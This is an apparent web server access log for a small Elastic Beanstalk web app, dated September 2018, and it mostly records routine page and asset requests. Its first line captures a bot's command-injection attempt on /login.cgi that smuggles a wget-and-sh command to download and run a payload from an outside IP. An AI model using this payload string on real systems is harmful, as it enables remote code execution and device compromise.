188.19.235.83 - - [01/Sep/2018:20:06:15 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.73.69.246/dl%20-O%20-%3E%20/tmp/.shinka2;sh%20/tmp/.shinka2%27$ HTTP/1.1" 400 173 "-" "Shinka/2.0" "-"
172.31.2.145 - - [01/Sep/2018:22:10:02 +0000] "GET /api/hello HTTP/1.1" 200 58 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:10:02 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 200 2671 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:10:32 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:10:32 +0000] "GET /static/js/main.dab076f3.js.map HTTP/1.1" 200 175567 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:10:32 +0000] "GET /static/css/main.c17080f1.css.map HTTP/1.1" 200 551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:14:57 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 200 2671 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:18:29 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:18:29 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:18:29 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 200 41982 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:18:32 +0000] "GET /api/hello HTTP/1.1" 200 58 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:18:32 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 200 2671 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:03 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:03 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:03 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 200 41982 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:04 +0000] "GET /static/css/main.c17080f1.css.map HTTP/1.1" 200 551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:05 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:05 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 200 2671 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:05 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:36 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:36 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:36 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 304 0 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:37 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 304 0 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:37 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:38 +0000] "GET /static/js/main.dab076f3.js.map HTTP/1.1" 200 175567 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:38 +0000] "GET /static/css/main.c17080f1.css.map HTTP/1.1" 200 551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:38 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.24.177 - - [01/Sep/2018:22:22:38 +0000] "GET /service-worker.js HTTP/1.1" 200 1378 "https://eye-of-horus.us-west-2.elasticbeanstalk.com/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:23:34 +0000] "GET / HTTP/1.1" 200 548 "-" "-" "115.238.132.60"
172.31.24.177 - - [01/Sep/2018:22:33:32 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89, 66.249.85.7"
172.31.2.145 - - [01/Sep/2018:22:33:32 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 304 0 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89, 66.249.85.17"
